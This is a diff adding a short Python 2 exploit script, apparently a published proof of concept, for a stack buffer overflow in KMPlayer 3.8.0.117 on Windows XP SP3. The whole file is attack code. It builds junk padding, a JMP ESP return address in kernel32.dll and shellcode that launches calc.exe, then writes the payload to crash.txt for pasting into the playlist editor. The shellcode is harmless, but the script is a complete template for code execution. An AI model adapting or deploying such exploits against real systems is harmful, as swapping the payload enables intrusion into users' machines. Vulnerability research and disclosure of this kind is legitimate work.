@@ -1,0 +1,32 @@
+#!/usr/bin/python
+# KMPlayer 3.8.0.117 Buffer Overflow
+# Author: metacom
+# Tested on: Windows Xp pro-sp3 En
+# Download link :http://www.chip.de/downloads/KMPlayer_33859258.html
+# Version: 3.8.0.117 Kmp Plus
+# Howto / Notes:
+# Run KMPlayer Playlist Editor > New Album and paste Exploit Code
+import struct
+def little_endian(address):
+  return struct.pack("<L",address)
+  
+
+junk = "\x41" * 250
+eip = little_endian(0x7C86467B)   #7C86467B   FFE4  JMP ESP  kernel32.dll        
+
+shellcode=(
+        "\x31\xC9"                #// xor ecx,ecx        
+        "\x51"                    #// push ecx        
+        "\x68\x63\x61\x6C\x63"    #// push 0x636c6163        
+        "\x54"                    #// push dword ptr esp        
+        "\xB8\xC7\x93\xC2\x77"    #// mov eax,0x77c293c7        
+        "\xFF\xD0"                #// call eax  
+		)
+
+exploit = junk + eip + shellcode
+try:
+    rst= open("crash.txt",'w')
+    rst.write(exploit)
+    rst.close()
+except:
+    print "Error"
